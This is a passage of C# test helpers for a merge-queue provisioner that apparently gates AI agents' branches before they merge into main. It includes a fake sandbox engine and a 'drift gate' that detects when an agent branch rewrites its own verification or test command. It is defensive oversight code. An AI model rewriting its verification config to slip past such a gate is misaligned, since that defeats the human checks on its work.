        return mirror.ObjectDatabase.FindMergeBase(main, tip)?.Sha == main.Sha;
    }

    private MergeQueueProvisioner NewProvisioner(int exitCode, out FakeSandboxEngine engine)
        => NewProvisioner(exitCode, out engine, new MergeQueueRegistry());

    private MergeQueueProvisioner NewProvisioner(int exitCode, out FakeSandboxEngine engine, out MergeQueueRegistry registry)
    {
        registry = new MergeQueueRegistry();
        return NewProvisioner(exitCode, out engine, registry);
    }

    private MergeQueueProvisioner NewProvisioner(int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry)
        => NewProvisioner(exitCode, out engine, registry, exitFor: null);

    private MergeQueueProvisioner NewProvisioner(
        int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry, Func<IReadOnlyList<string>, int>? exitFor)
        => NewProvisioner(exitCode, out engine, registry, exitFor, resolveApprovedPlan: null);

    private MergeQueueProvisioner NewProvisioner(
        int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry,
        Func<IReadOnlyList<string>, int>? exitFor, Func<string, TaskPlan?>? resolveApprovedPlan,
        IMergeBranchDiffService? mergeDiff = null)
    {
        engine = new FakeSandboxEngine(exitCode, exitFor);
        return new MergeQueueProvisioner(
            registry: registry,
            repos: new RepoProvisioner(_vmRoot),
            leases: new InMemoryMergeLeaseStore(),
            resolveContainerId: (_, _) => ContainerId,
            queueStore: _ => new InMemoryMergeQueueStore(),
            verificationStore: _ => new InMemoryVerificationStore(),
            sandboxes: engine,
            artifactDirectory: NewDir("mainguard-mqprov-artifacts-"),
            // P2-11: the production diff service over the same bare mirror, so the flagged-change review
            // classifies the REAL branch-vs-main diff rather than a hand-built patch list.
            mergeDiff: mergeDiff ?? new MergeBranchDiffService(
                new RepoProvisioner(_vmRoot),
                (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId)),
            resolveApprovedPlan: resolveApprovedPlan,
            // MG-3: the production wiring. The agent commits into its OWN repository now, so without the
            // daemon-side publish the RT-D2 provenance would be read off the mirror's stale copy of
            // agent/<id> — the branch's rewritten test command would be invisible and the drift gate
            // would silently stop firing while every assertion below still looked plausible.
            publishAgentRef: (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId),
            // ...and the production drift check alongside it. Wired for EVERY test in this class on
            // purpose: the interesting risk is not that it fires when it should, it is that it fires when
            // it should not. Every other test here commits on agent/<id> and must stay green.
            checkAgentBranch: (repoHash, agentId) => new WorktreeManager(_vmRoot).CheckAgentBranch(repoHash, agentId));
    }

    /// <summary>Seeds a source repo carrying a main-side verification config, then provisions its mirror.</summary>
    private string SeedAndProvision(string mainVerifyCommand, string? mainToolchain = null)
    {
        Repository.Init(_source);
        using (var repo = new Repository(_source))
        {
            repo.Config.Set("user.name", "test-user", ConfigurationLevel.Local);
            repo.Config.Set("user.email", "test@mainguard.local", ConfigurationLevel.Local);
            repo.Config.Set("core.autocrlf", false, ConfigurationLevel.Local);
        }

        WriteAndCommit(_source, MergeQueueProvisioner.VerificationConfigPath, mainVerifyCommand + "\n", "seed verify config");
        if (mainToolchain is not null)
        {
            WriteAndCommit(_source, MergeQueueProvisioner.ToolchainConfigPath, mainToolchain + "\n", "seed toolchain config");
        }

        return new RepoProvisioner(_vmRoot).Provision(_source).RepoHash;
    }

    /// <summary>
    /// Creates the agent worktree and lands work on agent/&lt;id&gt;. The branch always carries a real commit
    /// (an agent that changed nothing is not a merge candidate); the verification config is rewritten only
    /// when the test is exercising drift, so the "left it alone" control is a genuinely untouched config
    /// rather than a rewrite that happens to be identical.
    /// </summary>
    private void CommitOnAgentBranch(string repoHash, string branchVerifyCommand, string? branchToolchain = null)
    {
        var worktree = new WorktreeManager(_vmRoot).CreateAgentWorktree(repoHash, AgentId);
        WriteAndCommit(worktree, "feature.cs", "public class Feature { }\n", "the agent's actual work");

        RewriteIfDifferent(worktree, MergeQueueProvisioner.VerificationConfigPath, branchVerifyCommand, "branch verify config");
        if (branchToolchain is not null)
        {
            RewriteIfDifferent(worktree, MergeQueueProvisioner.ToolchainConfigPath, branchToolchain, "branch toolchain config");
        }
    }

    /// <summary>Writes only when the content really differs, so the "left it alone" controls are a
    /// genuinely untouched file rather than a rewrite that happens to be identical.</summary>
    private static void RewriteIfDifferent(string worktree, string relPath, string content, string message)
    {
        var full = Path.Combine(worktree, relPath);
        var wanted = content + "\n";
        if (File.Exists(full) && string.Equals(File.ReadAllText(full), wanted, StringComparison.Ordinal))
        {
            return;
        }

        WriteAndCommit(worktree, relPath, wanted, message);
    }

    private string MainSha(string repoHash)
    {
        using var repo = new Repository(new RepoProvisioner(_vmRoot).BareRepoPathFor(repoHash));
        return repo.Head.Tip.Sha;
    }

    private static void WriteAndCommit(string repoPath, string relPath, string content, string message)
    {
        var full = Path.Combine(repoPath, relPath);
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, content);
        using var repo = new Repository(repoPath);
        Commands.Stage(repo, relPath);
        var sig = new Signature("test-user", "test@mainguard.local", DateTimeOffset.Now);
        repo.Commit(message, sig, sig);
    }

    private static string NewDir(string prefix)
    {
        var path = Path.Combine(Path.GetTempPath(), prefix + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(path);
        return path;
    }

    public void Dispose()
    {
        TryDelete(_vmRoot);
        TryDelete(_source);
    }

    private static void TryDelete(string path)
    {
        try
        {
            if (!Directory.Exists(path)) return;
            foreach (var file in Directory.EnumerateFiles(path, "*", SearchOption.AllDirectories))
            {
                File.SetAttributes(file, FileAttributes.Normal);
            }

            Directory.Delete(path, recursive: true);
        }
        catch { /* never fail a test from cleanup */ }
    }

    /// <summary>Reports a fixed container-runtime exit and records what it was asked to run, where.</summary>
    private sealed class FakeSandboxEngine : ISandboxEngine
    {
        private readonly int _exitCode;
        private readonly Func<IReadOnlyList<string>, int>? _exitFor;

        public FakeSandboxEngine(int exitCode, Func<IReadOnlyList<string>, int>? exitFor = null)
        {
            _exitCode = exitCode;
            _exitFor = exitFor;
        }

        public string? LastContainerId { get; private set; }
        public IReadOnlyList<string>? LastCommand { get; private set; }

        /// <summary>EVERY exec, in order — the toolchain presence probes run before the verify command,
        /// so a test that only ever saw the LAST one could not tell which toolchain was probed.</summary>
        public List<IReadOnlyList<string>> Commands { get; } = new();

        public Task<SandboxExecResult> ExecAsync(string containerId, IReadOnlyList<string> command, CancellationToken ct = default)
        {
            LastContainerId = containerId;
            LastCommand = command;
            Commands.Add(command);
            return Task.FromResult(new SandboxExecResult(_exitFor?.Invoke(command) ?? _exitCode, "output", ""));
        }

        /// <summary>Every pause/unpause, in order — the P2-09 yield's fallback path is what makes it safe
        /// for the daemon to rewrite a worktree that is bind-mounted into a running jail, so a test of the
        /// keep-alive rebase has to be able to see that it happened.</summary>
        public List<string> FreezeLog { get; } = new();

        public Task<SandboxHandle> SpawnAsync(SandboxSpawnRequest request, CancellationToken ct = default) => throw new NotSupportedException();

        public Task PauseAsync(string containerId, CancellationToken ct = default)
        {
            FreezeLog.Add("pause:" + containerId);
            return Task.CompletedTask;
        }

        public Task UnpauseAsync(string containerId, CancellationToken ct = default)
        {
            FreezeLog.Add("unpause:" + containerId);
            return Task.CompletedTask;
        }

        public Task StopAsync(string containerId, CancellationToken ct = default) => throw new NotSupportedException();
        public Task RemoveAsync(string containerId, CancellationToken ct = default) => throw new NotSupportedException();
    }
}
